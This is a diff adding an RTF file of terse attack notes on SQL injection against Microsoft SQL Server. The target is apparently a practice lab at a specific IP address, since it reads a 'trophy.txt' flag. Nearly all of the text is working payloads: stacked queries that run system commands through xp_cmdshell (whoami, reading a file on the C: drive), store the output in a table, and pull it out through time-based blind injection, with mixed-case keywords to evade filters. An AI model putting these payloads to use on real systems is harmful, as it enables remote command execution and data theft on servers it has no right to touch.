@@ -1,0 +1,59 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;\red53\green53\blue53;\red220\green161\blue13;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww16100\viewh9620\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 \
+
+\b\fs32 IDEA IS TO CREATE A TABLE AND A COLUMN AND IN THERE STORE THE OUTPUT OF CMDSHELL\
+
+\b0\fs24 \cf2 \
+{\field{\*\fldinst{HYPERLINK "https://www.gracefulsecurity.com/sql-injection-exploitation/"}}{\fldrslt https://www.gracefulsecurity.com/sql-injection-exploitation/}}\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\cf2 \
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf2 create table readWhoami (line varchar(2000))\
+insert into readWhoami\
+  exec xp_cmdshell \'91whoami.exe\'92\
+select TOP 1 line from readWhoami\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;cReAte%20tAbLe%20readWhoami%20(line%20nvarchar(2000));"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;cReAte%20tAbLe%20readWhoami%20(line%20nvarchar(2000));}}\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;inSeRt%20into%20readWhoami%20(line)%20exec%20xp_cMdsHell%20%27whoami.exe%27--"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;inSeRt%20into%20readWhoami%20(line)%20exec%20xp_cMdsHell%20%27whoami.exe%27--}}\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;if%20(ASCII(substring((sElEcT%20TOP%201%20line%20from%20readWhoami),1,1))=110)%20WAITFOR%20DELAY%20%2700:00:10%27--"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;if%20(ASCII(substring((sElEcT%20TOP%201%20line%20from%20readWhoami),1,1))=110)%20WAITFOR%20DELAY%20%2700:00:10%27--}}\cf3 \
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab560\slleading20\partightenfactor0
+\cf2 create table readTrophy(line varchar(2000))\
+insert into readTrophy\
+  exec xp_cmdshell 'type \'93c:\\trophy.txt\'94 '\
+select line from readTrophy\
+drop table readTrophy\
+\
+\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf2 create table\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;cReAte%20tAbLe%20readTrophy%20(line%20nvarchar(2000));"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;cReAte%20tAbLe%20readTrophy%20(line%20nvarchar(2000));}}\
+\
+insert data\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;inSeRt%20into%20readTrophy%20(line)%20exec%20xp_cMdsHell%20'type%20%22c:%5Ctrophy.txt%22';--"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;inSeRt%20into%20readTrophy%20(line)%20exec%20xp_cMdsHell%20%27type%20%22c:\\trophy.txt%22%27;--}}\
+\
+read using time\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;if%20(ASCII(substring((sElEcT%20TOP%201%20line%20from%20readTrophy),1,1))=87)%20WAITFOR%20DELAY%20%2700:00:10%27--"}}{\fldrslt \cf3 http://46.17.59.200/sqli/select2/scase2_noerror.aspx?id=1;if%20(ASCII(substring((sElEcT%20TOP%201%20line%20from%20readTrophy),1,1))=87)%20WAITFOR%20DELAY%20%2700:00:10%27--}}\
+\pard\pardeftab560\slleading20\pardirnatural\partightenfactor0
+\cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97}
